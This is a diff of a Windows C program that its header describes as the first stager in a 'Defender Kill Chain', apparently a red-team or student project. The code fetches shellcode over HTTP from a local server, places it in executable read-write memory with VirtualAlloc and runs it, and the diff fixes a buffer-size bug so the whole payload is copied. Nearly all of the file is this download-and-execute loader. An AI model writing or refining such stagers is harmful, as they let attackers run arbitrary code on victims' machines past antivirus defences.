@@ -1,7 +1,7 @@
 #include <windows.h>
 #include "webreq.h"
 #include <stdio.h>
-void execute_shellcode(char *shellcode);
+void execute_shellcode(char *shellcode, size_t shellcodeSize);
 
 /************************************************************************
 Author:       Noah Ostle
@@ -18,15 +18,17 @@ Description:  This file is the first stager in our Defender Kill Chain.
 
 
 int main() {
-    unsigned char* shellcode=fetch_url("http://localhost:3000/MessageBoxShellcode");
+    unsigned char* shellcode = malloc(400000);
+    size_t shellcodeSize = 400000;
+    fetch_url("http://localhost:3000/MessageBoxShellcode", shellcode, &shellcodeSize);
     printf("%s", shellcode);
-    execute_shellcode(shellcode);
+    execute_shellcode(shellcode, shellcodeSize);
 }
 
 
 
-void execute_shellcode(char *shellcode){
-    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(exec, shellcode, sizeof(shellcode));
+void execute_shellcode(char *shellcode, size_t shellcodeSize){
+    void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, shellcodeSize);
     ((void(*)())exec)(); // Execute shellcode
 }
